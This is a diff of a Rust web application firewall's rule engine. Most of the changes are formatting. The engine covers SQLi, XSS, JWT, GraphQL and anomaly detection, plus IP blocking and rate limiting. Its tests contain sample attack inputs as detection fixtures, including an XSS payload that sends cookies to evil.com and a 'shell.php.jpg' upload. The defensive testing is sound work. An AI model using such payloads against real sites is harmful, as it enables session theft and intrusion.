@@ -1,19 +1,19 @@
-pub mod body;
-pub mod headers;
-pub mod uri;
 pub mod anomaly;
 pub mod api;
-pub mod graphql;
-pub mod trust;
-pub mod redteam;
-pub mod bot_challenge;
-pub mod threat_intel;
 pub mod api_security;
+pub mod body;
+pub mod bot_challenge;
 pub mod evasion;
-pub mod rate_limit;
+pub mod graphql;
+pub mod headers;
 pub mod multipart;
-use dashmap::DashMap;
+pub mod rate_limit;
+pub mod redteam;
+pub mod threat_intel;
+pub mod trust;
+pub mod uri;
 use ahash::AHashMap;
+use dashmap::DashMap;
 use std::net::IpAddr;
 use unicode_normalization::UnicodeNormalization;
 
@@ -57,7 +57,6 @@ impl Severity {
         }
     }
 }
-
 
 #[allow(dead_code)]
 pub struct Rule {
@@ -178,7 +177,7 @@ pub fn record_block(ip: IpAddr) -> bool {
                 let mut xdp = crate::XDP_MANAGER.lock().await;
                 if let IpAddr::V4(v4) = ip_clone {
                     let _ = xdp.block_ip(v4);
-                    
+
                     // Broadcast via Gossip
                     let gossip_lock = crate::GOSSIP_MANAGER.lock().await;
                     if let Some(gossip) = gossip_lock.as_ref() {
@@ -493,22 +492,25 @@ impl RuleEngine {
         let is_anomaly_mode = self.scoring_mode == "anomaly";
         let mut anomaly_matches = Vec::new();
 
-        let mut process_match = |rule_id: String, message: String, score: u32| -> Option<(String, String)> {
-            if is_anomaly_mode {
-                anomaly_matches.push(AnomalyMatch {
-                    rule_id,
-                    message,
-                    score,
-                });
-                None
-            } else {
-                Some((rule_id, message))
-            }
-        };
+        let mut process_match =
+            |rule_id: String, message: String, score: u32| -> Option<(String, String)> {
+                if is_anomaly_mode {
+                    anomaly_matches.push(AnomalyMatch {
+                        rule_id,
+                        message,
+                        score,
+                    });
+                    None
+                } else {
+                    Some((rule_id, message))
+                }
+            };
 
         // Evasion Protection Check (Phase 9)
         if let Some((rule_id, msg)) = evasion::check_evasion(path, headers) {
-            if let Some(res) = process_match(rule_id.to_string(), format!("Evasion Block: {}", msg), 5) {
+            if let Some(res) =
+                process_match(rule_id.to_string(), format!("Evasion Block: {}", msg), 5)
+            {
                 return Some(res);
             }
         }
@@ -516,7 +518,11 @@ impl RuleEngine {
         // API Security: JWT Token Inspection & Verification
         if is_rule_enabled("JWT-VALIDATION", enabled_rules) {
             if let Some(err_msg) = api::check_jwt_token(headers) {
-                if let Some(res) = process_match("JWT-VALIDATION".to_string(), format!("API Security Block: {}", err_msg), 5) {
+                if let Some(res) = process_match(
+                    "JWT-VALIDATION".to_string(),
+                    format!("API Security Block: {}", err_msg),
+                    5,
+                ) {
                     return Some(res);
                 }
             }
@@ -525,7 +531,11 @@ impl RuleEngine {
         // API Security: GraphQL Query Complexity & Depth Analysis
         if is_rule_enabled("GRAPHQL-COMPLEXITY", enabled_rules) {
             if let Some(err_msg) = graphql::check_graphql_complexity_limits(path, query, body) {
-                if let Some(res) = process_match("GRAPHQL-COMPLEXITY".to_string(), format!("API Security Block: {}", err_msg), 4) {
+                if let Some(res) = process_match(
+                    "GRAPHQL-COMPLEXITY".to_string(),
+                    format!("API Security Block: {}", err_msg),
+                    4,
+                ) {
                     return Some(res);
                 }
             }
@@ -533,10 +543,14 @@ impl RuleEngine {
 
         // API Security: OpenAPI Schema Parameter Validation
         if is_rule_enabled("OPENAPI-VALIDATION", enabled_rules) {
-            if let Some(err_msg) = api::check_openapi_schema_validation(
-                path, query, method, &self.api_schemas,
-            ) {
-                if let Some(res) = process_match("OPENAPI-VALIDATION".to_string(), format!("API Security Block: {}", err_msg), 3) {
+            if let Some(err_msg) =
+                api::check_openapi_schema_validation(path, query, method, &self.api_schemas)
+            {
+                if let Some(res) = process_match(
+                    "OPENAPI-VALIDATION".to_string(),
+                    format!("API Security Block: {}", err_msg),
+                    3,
+                ) {
                     return Some(res);
                 }
             }
@@ -563,13 +577,17 @@ impl RuleEngine {
             if let Some(msg) = trust::check_zero_trust(
                 headers,
                 reputation_clean,
-                true, // fingerprint_stable — already checked in proxy_engine
-                true, // geo_match — already checked in proxy_engine
+                true,  // fingerprint_stable — already checked in proxy_engine
+                true,  // geo_match — already checked in proxy_engine
                 false, // tls — not available at rule engine level
                 &self.zt_allowed_issuers,
                 self.zt_min_score,
             ) {
-                if let Some(res) = process_match("ZT-TRUST-SCORE".to_string(), format!("Zero Trust Block: {}", msg), 4) {
+                if let Some(res) = process_match(
+                    "ZT-TRUST-SCORE".to_string(),
+                    format!("Zero Trust Block: {}", msg),
+                    4,
+                ) {
                     return Some(res);
                 }
             }
@@ -641,7 +659,11 @@ impl RuleEngine {
             };
 
             if matched && rule.action == "block" {
-                if let Some(res) = process_match(rule.id.clone(), format!("Custom rule block: {}", rule.name), 4) {
+                if let Some(res) = process_match(
+                    rule.id.clone(),
+                    format!("Custom rule block: {}", rule.name),
+                    4,
+                ) {
                     return Some(res);
                 }
             }
@@ -651,21 +673,33 @@ impl RuleEngine {
         if is_rule_enabled("SQLI-AST", enabled_rules) {
             if let Some(msg) = check_sql_injection_semantic(&norm_query) {
                 if !is_safe_ast_signature(path, &norm_query) {
-                    if let Some(res) = process_match("SQLI-AST".to_string(), format!("Semantic SQLi block: {}", msg), 5) {
+                    if let Some(res) = process_match(
+                        "SQLI-AST".to_string(),
+                        format!("Semantic SQLi block: {}", msg),
+                        5,
+                    ) {
                         return Some(res);
                     }
                 }
             }
             if let Some(msg) = check_sql_injection_semantic(&norm_body) {
                 if !is_safe_ast_signature(path, &norm_body) {
-                    if let Some(res) = process_match("SQLI-AST".to_string(), format!("Semantic SQLi block: {}", msg), 5) {
+                    if let Some(res) = process_match(
+                        "SQLI-AST".to_string(),
+                        format!("Semantic SQLi block: {}", msg),
+                        5,
+                    ) {
                         return Some(res);
                     }
                 }
             }
             if let Some(msg) = check_sql_injection_semantic(&norm_path) {
                 if !is_safe_ast_signature(path, &norm_path) {
-                    if let Some(res) = process_match("SQLI-AST".to_string(), format!("Semantic SQLi block: {}", msg), 5) {
+                    if let Some(res) = process_match(
+                        "SQLI-AST".to_string(),
+                        format!("Semantic SQLi block: {}", msg),
+                        5,
+                    ) {
                         return Some(res);
                     }
                 }
@@ -675,21 +709,33 @@ impl RuleEngine {
         if is_rule_enabled("XSS-AST", enabled_rules) {
             if let Some(msg) = check_xss_injection_semantic(&norm_query) {
                 if !is_safe_ast_signature(path, &norm_query) {
-                    if let Some(res) = process_match("XSS-AST".to_string(), format!("Semantic XSS block: {}", msg), 5) {
+                    if let Some(res) = process_match(
+                        "XSS-AST".to_string(),
+                        format!("Semantic XSS block: {}", msg),
+                        5,
+                    ) {
                         return Some(res);
                     }
                 }
             }
             if let Some(msg) = check_xss_injection_semantic(&norm_body) {
                 if !is_safe_ast_signature(path, &norm_body) {
-                    if let Some(res) = process_match("XSS-AST".to_string(), format!("Semantic XSS block: {}", msg), 5) {
+                    if let Some(res) = process_match(
+                        "XSS-AST".to_string(),
+                        format!("Semantic XSS block: {}", msg),
+                        5,
+                    ) {
                         return Some(res);
                     }
                 }
             }
             if let Some(msg) = check_xss_injection_semantic(&norm_path) {
                 if !is_safe_ast_signature(path, &norm_path) {
-                    if let Some(res) = process_match("XSS-AST".to_string(), format!("Semantic XSS block: {}", msg), 5) {
+                    if let Some(res) = process_match(
+                        "XSS-AST".to_string(),
+                        format!("Semantic XSS block: {}", msg),
+                        5,
+                    ) {
                         return Some(res);
                     }
                 }
@@ -699,7 +745,11 @@ impl RuleEngine {
         // Phase 1: Headers
         for rule in headers::HEADER_RULES {
             if is_rule_enabled(rule.id, enabled_rules) && (rule.check)(&req_info) {
-                if let Some(res) = process_match(rule.id.to_string(), format!("{}: {}", rule.name, rule.description), rule.severity.score()) {
+                if let Some(res) = process_match(
+                    rule.id.to_string(),
+                    format!("{}: {}", rule.name, rule.description),
+                    rule.severity.score(),
+                ) {
                     return Some(res);
                 }
             }
@@ -708,7 +758,11 @@ impl RuleEngine {
         // Phase 2: URI + Query
         for rule in uri::URI_RULES {
             if is_rule_enabled(rule.id, enabled_rules) && (rule.check)(&req_info) {
-                if let Some(res) = process_match(rule.id.to_string(), format!("{}: {}", rule.name, rule.description), rule.severity.score()) {
+                if let Some(res) = process_match(
+                    rule.id.to_string(),
+                    format!("{}: {}", rule.name, rule.description),
+                    rule.severity.score(),
+                ) {
                     return Some(res);
                 }
             }
@@ -732,7 +786,10 @@ impl RuleEngine {
             for finding in findings {
                 if let Some(res) = process_match(
                     finding.rule_id.to_string(),
-                    format!("Multipart upload block: {} (file: {})", finding.description, finding.filename),
+                    format!(
+                        "Multipart upload block: {} (file: {})",
+                        finding.description, finding.filename
+                    ),
                     5,
                 ) {
                     return Some(res);
@@ -743,7 +800,11 @@ impl RuleEngine {
         // Phase 3: Body
         for rule in body::BODY_RULES {
             if is_rule_enabled(rule.id, enabled_rules) && (rule.check)(&req_info) {
-                if let Some(res) = process_match(rule.id.to_string(), format!("{}: {}", rule.name, rule.description), rule.severity.score()) {
+                if let Some(res) = process_match(
+                    rule.id.to_string(),
+                    format!("{}: {}", rule.name, rule.description),
+                    rule.severity.score(),
+                ) {
                     return Some(res);
                 }
             }
@@ -755,7 +816,10 @@ impl RuleEngine {
             if query_entropy > 5.5 {
                 if let Some(res) = process_match(
                     "ANOMALY-DETECTION".to_string(),
-                    format!("Entropy anomaly block: query entropy ({:.2}) exceeds threshold (5.5)", query_entropy),
+                    format!(
+                        "Entropy anomaly block: query entropy ({:.2}) exceeds threshold (5.5)",
+                        query_entropy
+                    ),
                     4,
                 ) {
                     return Some(res);
@@ -766,7 +830,10 @@ impl RuleEngine {
             if body_entropy > 5.8 {
                 if let Some(res) = process_match(
                     "ANOMALY-DETECTION".to_string(),
-                    format!("High body entropy anomaly detected: {:.2} bits", body_entropy),
+                    format!(
+                        "High body entropy anomaly detected: {:.2} bits",
+                        body_entropy
+                    ),
                     4,
                 ) {
                     return Some(res);
@@ -780,7 +847,10 @@ impl RuleEngine {
             if path_anomaly > 0.85 {
                 if let Some(res) = process_match(
                     "ANOMALY-DETECTION".to_string(),
-                    format!("AI/ML anomaly block: path anomaly score ({:.2}) exceeds threshold (0.85)", path_anomaly),
+                    format!(
+                        "AI/ML anomaly block: path anomaly score ({:.2}) exceeds threshold (0.85)",
+                        path_anomaly
+                    ),
                     4,
                 ) {
                     return Some(res);
@@ -789,7 +859,10 @@ impl RuleEngine {
             if query_anomaly > 0.85 {
                 if let Some(res) = process_match(
                     "ANOMALY-DETECTION".to_string(),
-                    format!("AI/ML anomaly block: query anomaly score ({:.2}) exceeds threshold (0.85)", query_anomaly),
+                    format!(
+                        "AI/ML anomaly block: query anomaly score ({:.2}) exceeds threshold (0.85)",
+                        query_anomaly
+                    ),
                     4,
                 ) {
                     return Some(res);
@@ -798,7 +871,10 @@ impl RuleEngine {
             if body_anomaly > 0.85 {
                 if let Some(res) = process_match(
                     "ANOMALY-DETECTION".to_string(),
-                    format!("AI/ML anomaly block: body anomaly score ({:.2}) exceeds threshold (0.85)", body_anomaly),
+                    format!(
+                        "AI/ML anomaly block: body anomaly score ({:.2}) exceeds threshold (0.85)",
+                        body_anomaly
+                    ),
                     4,
                 ) {
                     return Some(res);
@@ -810,9 +886,13 @@ impl RuleEngine {
         if is_anomaly_mode && !anomaly_matches.is_empty() {
             let total_score: u32 = anomaly_matches.iter().map(|m| m.score).sum();
             if total_score >= self.anomaly_threshold {
-                let violated_rules: Vec<String> = anomaly_matches.iter().map(|m| m.rule_id.clone()).collect();
+                let violated_rules: Vec<String> =
+                    anomaly_matches.iter().map(|m| m.rule_id.clone()).collect();
                 let joined_rules = violated_rules.join(", ");
-                let messages: Vec<String> = anomaly_matches.iter().map(|m| format!("[{}]: {}", m.rule_id, m.message)).collect();
+                let messages: Vec<String> = anomaly_matches
+                    .iter()
+                    .map(|m| format!("[{}]: {}", m.rule_id, m.message))
+                    .collect();
                 let joined_messages = messages.join("; ");
 
                 return Some((
@@ -1085,7 +1165,8 @@ fn tokenize_sql(input: &str) -> Vec<SqlToken> {
     tokens
 }
 
-static SAFE_AST_PROFILES: Lazy<DashMap<String, std::collections::HashSet<String>>> = Lazy::new(DashMap::new);
+static SAFE_AST_PROFILES: Lazy<DashMap<String, std::collections::HashSet<String>>> =
+    Lazy::new(DashMap::new);
 
 pub fn learn_safe_ast_profile(path: &str, input: &str) {
     if input.is_empty() {
@@ -1366,7 +1447,12 @@ impl RuleEngine {
 
     /// Rate limiter check (token bucket). Return true jika diizinkan.
     /// `user_key` opsional — kalau ada, key = `ip|user_key` (API key / user ID).
-    pub fn check_rate_limit_local(&self, ip: IpAddr, limit: u32, user_key: Option<&str>) -> RateLimitStatus {
+    pub fn check_rate_limit_local(
+        &self,
+        ip: IpAddr,
+        limit: u32,
+        user_key: Option<&str>,
+    ) -> RateLimitStatus {
         let rate = limit as f64 / 60.0; // req per detik
         let capacity = rate * 2.0; // burst 2x
         let key = Self::rate_limit_key(ip, user_key);
@@ -1502,10 +1588,8 @@ impl RuleEngine {
                         .await;
 
                     // 2. Count entries currently inside the window
-                    let count: redis::RedisResult<u32> = redis::cmd("ZCARD")
-                        .arg(&key)
-                        .query_async(&mut conn)
-                        .await;
+                    let count: redis::RedisResult<u32> =
+                        redis::cmd("ZCARD").arg(&key).query_async(&mut conn).await;
 
                     if let Ok(count_val) = count {
                         if count_val >= limit {
@@ -1554,9 +1638,13 @@ pub struct WafGossipHandler;
 #[async_trait::async_trait]
 impl crate::gossip::GossipHandler for WafGossipHandler {
     async fn on_threat_intel(&self, msg: &crate::gossip::ThreatIntelMessage) {
-        tracing::warn!("Gossip received: blocking {} (score: {})", msg.ip, msg.score);
+        tracing::warn!(
+            "Gossip received: blocking {} (score: {})",
+            msg.ip,
+            msg.score
+        );
         let ip = std::net::IpAddr::V4(msg.ip);
-        
+
         // Update local block record without triggering broadcast
         let now = tokio::time::Instant::now();
         let mut entry = BLOCKED_IPS.entry(ip).or_insert_with(|| BlockRecord {
@@ -1579,9 +1667,9 @@ impl crate::gossip::GossipHandler for WafGossipHandler {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use ahash::AHashMap as HashMap;
     use crate::config::GlobalConfig;
     use crate::config::TlsConfig;
+    use ahash::AHashMap as HashMap;
 
     fn test_config() -> Config {
         Config {
@@ -1855,7 +1943,11 @@ mod tests {
             }
         }
         // Should be ≤ initial burst + 1 refill (burst = 2*(5/60) ≈ 0.166 → at least 1 initial)
-        assert!(allowed <= 1, "allowed={} (expected ≤1 for limit=5 req/min)", allowed);
+        assert!(
+            allowed <= 1,
+            "allowed={} (expected ≤1 for limit=5 req/min)",
+            allowed
+        );
     }
 
     #[test]
@@ -1868,27 +1960,26 @@ mod tests {
         // With limit=0, rate=0, capacity=0 → tokens always 0 → always denied
         // This is suspicious — let's verify
         for _ in 0..3 {
-            assert!(!engine.check_rate_limit_local(ip, 0, None).allowed, "limit=0 should deny (capacity=0)");
+            assert!(
+                !engine.check_rate_limit_local(ip, 0, None).allowed,
+                "limit=0 should deny (capacity=0)"
+            );
         }
     }
 
     #[test]
     fn test_ja4_fingerprint_blocked() {
         let engine = RuleEngine::new(&test_config());
-        
+
         // 1. Spoofed Chrome user-agent (contains Chrome, but missing sec-ch-ua header)
         let mut headers = HashMap::new();
-        headers.insert("user-agent".to_string(), "Mozilla/5.0 Chrome/120.0.0.0".to_string());
-        
-        let result = engine.check_request(
-            "/",
-            "",
-            &headers,
-            "",
-            None,
-            "GET",
-            &["BOT-JA4".to_string()],
+        headers.insert(
+            "user-agent".to_string(),
+            "Mozilla/5.0 Chrome/120.0.0.0".to_string(),
         );
+
+        let result =
+            engine.check_request("/", "", &headers, "", None, "GET", &["BOT-JA4".to_string()]);
         assert!(result.is_some());
         let (rule_id, _) = result.unwrap();
         assert_eq!(rule_id, "BOT-JA4");
@@ -1898,7 +1989,7 @@ mod tests {
     fn test_ast_profiling_self_learning() {
         let engine = RuleEngine::new(&test_config());
         let headers = HashMap::new();
-        
+
         // 1. Submit normal text containing SQL keywords to "/post-comment"
         // This is clean, so it will pass and the engine will learn the AST profile.
         let result1 = engine.check_request(
@@ -1911,7 +2002,7 @@ mod tests {
             &["SQLI-AST".to_string()],
         );
         assert!(result1.is_none());
-        
+
         // 2. Submit the same AST structure (with comments or similar) to the learned path
         // Since it matches the safe profiled signature, it will be allowed (false positive mitigation)!
         let result2 = engine.check_request(
@@ -1930,7 +2021,7 @@ mod tests {
     fn test_markov_chain_anomaly_detection() {
         let engine = RuleEngine::new(&test_config());
         let headers = HashMap::new();
-        
+
         let result_normal = engine.check_request(
             "/api/v1/users/profile",
             "",
@@ -1941,7 +2032,7 @@ mod tests {
             &["ANOMALY-DETECTION".to_string()],
         );
         assert!(result_normal.is_none());
-        
+
         let result_anomaly = engine.check_request(
             "/search",
             "q=<script>alert(document.cookie);window.location='http://evil.com/steal?c='+cookie;</script>",
@@ -1960,7 +2051,7 @@ mod tests {
     fn test_jwt_validation_integration() {
         let engine = RuleEngine::new(&test_config());
         let mut headers = HashMap::new();
-        
+
         let result_none = engine.check_request(
             "/api/v1/data",
             "",
@@ -1971,7 +2062,7 @@ mod tests {
             &["JWT-VALIDATION".to_string()],
         );
         assert!(result_none.is_none());
-        
+
         let expired_jwt = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.signature";
         headers.insert("Authorization".to_string(), expired_jwt.to_string());
         let result_expired = engine.check_request(
@@ -1987,7 +2078,7 @@ mod tests {
         let (rule_id, msg) = result_expired.unwrap();
         assert_eq!(rule_id, "JWT-VALIDATION");
         assert!(msg.contains("Expired JWT"));
-        
+
         let mut headers_valid = HashMap::new();
         let valid_jwt = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjIxNDc0ODM2NDd9.signature";
         headers_valid.insert("Authorization".to_string(), valid_jwt.to_string());
@@ -2007,7 +2098,7 @@ mod tests {
     fn test_graphql_complexity_integration() {
         let engine = RuleEngine::new(&test_config());
         let headers = HashMap::new();
-        
+
         // 1. Normal GraphQL query -> Allowed
         let normal_query = "{\"query\": \"{ user { name } }\"}";
         let result_normal = engine.check_request(
@@ -2020,7 +2111,7 @@ mod tests {
             &["GRAPHQL-COMPLEXITY".to_string()],
         );
         assert!(result_normal.is_none());
-        
+
         // 2. Extremely deep nested query -> Blocked
         let deep_query = "{\"query\": \"{ a { b { c { d { e { f { name } } } } } } }\"}";
         let result_deep = engine.check_request(
@@ -2046,13 +2137,11 @@ mod tests {
         cfg.api_schemas = vec![RouteSchema {
             path: "/api/v1/items".to_string(),
             method: "GET".to_string(),
-            parameters: vec![
-                ParameterSchema {
-                    name: "limit".to_string(),
-                    param_type: "integer".to_string(),
-                    required: true,
-                },
-            ],
+            parameters: vec![ParameterSchema {
+                name: "limit".to_string(),
+                param_type: "integer".to_string(),
+                required: true,
+            }],
         }];
 
         let engine = RuleEngine::new(&cfg);
@@ -2120,7 +2209,10 @@ mod tests {
             &["HPP-001".to_string()], // only enable HPP-001
         );
         // Anomaly score is 3, which is < threshold (5). Request should pass (return None).
-        assert!(res_low.is_none(), "Request with score 3 should pass when threshold is 5");
+        assert!(
+            res_low.is_none(),
+            "Request with score 3 should pass when threshold is 5"
+        );
 
         // 2. Trigger rule that meets or exceeds the threshold (e.g. LFI-002 has severity Critical = 5)
         // LFI-002 triggers when query contains php://filter wrapper.
@@ -2134,7 +2226,10 @@ mod tests {
             &["LFI-002".to_string()],
         );
         // Anomaly score is 5, which is >= threshold (5). Request should be blocked.
-        assert!(res_high.is_some(), "Request with score 5 should be blocked when threshold is 5");
+        assert!(
+            res_high.is_some(),
+            "Request with score 5 should be blocked when threshold is 5"
+        );
         let (rule_id, msg) = res_high.unwrap();
         assert_eq!(rule_id, "ANOMALY-THRESHOLD-EXCEEDED");
         assert!(msg.contains("Anomaly score (5) exceeded threshold (5)"));
@@ -2158,7 +2253,10 @@ mod tests {
             "GET",
             &["HPP-001".to_string()],
         );
-        assert!(res.is_some(), "HPP-001 should block immediately in immediate mode");
+        assert!(
+            res.is_some(),
+            "HPP-001 should block immediately in immediate mode"
+        );
         let (rule_id, _) = res.unwrap();
         assert_eq!(rule_id, "HPP-001");
     }
@@ -2167,8 +2265,11 @@ mod tests {
     fn test_multipart_bypass_blocked() {
         let engine = RuleEngine::new(&test_config());
         let mut headers = HashMap::new();
-        headers.insert("content-type".to_string(), "multipart/form-data; boundary=boundary123".to_string());
-        
+        headers.insert(
+            "content-type".to_string(),
+            "multipart/form-data; boundary=boundary123".to_string(),
+        );
+
         let body = b"\
 --boundary123\r\n\
 Content-Disposition: form-data; name=\"file\"; filename=\"shell.php.jpg\"\r\n\
@@ -2177,21 +2278,11 @@ dummy-content\r\n\
 --boundary123--\r\n";
         let body_str = String::from_utf8_lossy(body);
 
-        let res = engine.check_request(
-            "/upload",
-            "",
-            &headers,
-            &body_str,
-            None,
-            "POST",
-            &[],
-        );
-        
+        let res = engine.check_request("/upload", "", &headers, &body_str, None, "POST", &[]);
+
         assert!(res.is_some());
         let (rule_id, msg) = res.unwrap();
         assert_eq!(rule_id, "MULTIPART-DOUBLE-EXT");
         assert!(msg.contains("Double extension detected"));
     }
 }
-
-
